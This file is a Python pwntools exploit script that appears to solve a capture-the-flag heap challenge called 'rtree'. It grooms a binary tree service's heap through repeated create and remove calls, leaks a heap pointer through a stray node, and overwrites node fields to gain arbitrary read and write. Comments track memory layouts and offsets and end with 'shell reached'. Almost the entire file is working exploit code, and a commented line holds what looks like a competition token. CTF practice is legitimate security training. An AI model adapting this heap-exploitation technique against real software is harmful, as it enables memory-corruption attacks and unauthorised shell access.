from pwn import *

# conn = remote('prob14.geekgame.pku.edu.cn', '10014')
conn = process('./rtree')
# root = 4040b0

# print(conn.recvuntil(b'token: '), end = '>\n')
# conn.sendline(b'165:MEQCIAO8Cvf2ewr9c8j2xJV-2MKt019qD2WRxsITgGZxEv-aAiApyfqPGe_LnG5HPuSqMFZzFLumbfL6yfGLiFS2WrnJQw==')

# int32  char*   int32   node*  node*  node*  node*   
# key    data    size    lson   rson   fath   next    

# 0 at 0x5634e1f952a0
# lson: -4
# rson: <?>

# -4 at 

def nodbgcreate(key, len, payload):
    conn.recvuntil(b'>>')
    conn.sendline(b'1')
    conn.recvuntil(b'key')
    conn.sendline(f'{key}'.encode('utf-8'))
    conn.recvuntil(b'data')
    conn.sendline(f'{len}'.encode('utf-8'))
    conn.recvuntil(b'data')
    conn.sendline(payload)


def create(key, len, payload):
    print(conn.recvuntil(b'>>'))
    conn.sendline(b'1')
    print(conn.recvuntil(b'key'))
    conn.sendline(f'{key}'.encode('utf-8'))
    print(conn.recvuntil(b'data'))
    conn.sendline(f'{len}'.encode('utf-8'))
    print(conn.recvuntil(b'data'))
    conn.sendline(payload)

def remove(key):
    print(conn.recvuntil(b'>>'))
    conn.sendline(b'3')
    print(conn.recvuntil(b'remove'))
    conn.sendline(f'{key}'.encode('utf-8'))

def debug():
    gdb.attach(proc.pidof(conn)[0])

create(0, 640000, b'root')
for _ in range(16):
    for siz in range(2, 128):
        nodbgcreate(0, siz, b'\x00')

print('done')

create(         -9,         56, b'dummy_block')
create(        -10,         56, b'dummy_block')
remove(        -10)
remove(         -9)
# [-9h D][-9d D]

create(        -11,       4096, b'dummy_block')
create(          1,         56, b'vuln') 
create(          1,       4096, b'vuln_next')

# [-11h][1h][1d][1*h][...]

# debug()

remove(          1)
remove(        -11)

# [-11h D][1h D][1d D][1*h][...]

# debug()

create(         -4,       56, b'')

# [-4h][-4d!][1d D][1*h][...]

#print(conn.recvuntil(b'>>'))
#conn.sendline(b'2')
#numb = 0
#print(conn.recvuntil(b'show'))
#conn.sendline(f'{numb}'.encode('utf-8'))

# now we can use update(-4) to access the stray node 1

print(conn.recvuntil(b'>>'))
conn.sendline(b'2')
numb = -4
print(conn.recvuntil(b'show'))
conn.sendline(f'{numb}'.encode('utf-8'))

print(conn.recvuntil(b'is: \n'))
resp = conn.recvuntil(b'welcome to the Tree of Pwn', drop=True)

# address of [1d D] above ... + 0x40 ? 
# print('resp = ', resp.hex())
# value = resp.

# nextPtr          #!               #siz             
# 0a889549f5550000 0000000000000000 3800000000000000 0000000000000000 0000000000000000 a0129149f5550000 a0889549f5550000
val = int.from_bytes(resp, byteorder='little')
# print(val)

addr = 2 ** 64

ptrval = val % addr
updatewrite = val + (ptrval - 0x40) * addr - ptrval + 1

hack4 = updatewrite.to_bytes(56, byteorder='little')

print(conn.recvuntil(b'>>'))
conn.sendline(b'4')
numb = -4
print(conn.recvuntil(b'data'))
conn.sendline(f'{numb}'.encode('utf-8'))
print(conn.recvuntil(b'data'))
conn.sendline(hack4)

# conn.interactive()

print(conn.recvuntil(b'>>'))
conn.sendline(b'2')
numb = 1
print(conn.recvuntil(b'show'))
conn.sendline(f'{numb}'.encode('utf-8'))
print(conn.recvuntil(b'is: \n'))
resp = conn.recvuntil(b'welcome to the Tree of Pwn', drop=True)

print('resp = ', resp.hex())


gdb.attach(proc.pidof(conn)[0])
conn.interactive()

# r10+0x202e
# root   = +0x00004050

# r10-0x64b
# info() = +0x000019d7



conn.sendline(b'2')
conn.sendline(b'2')
# shell reached
# 
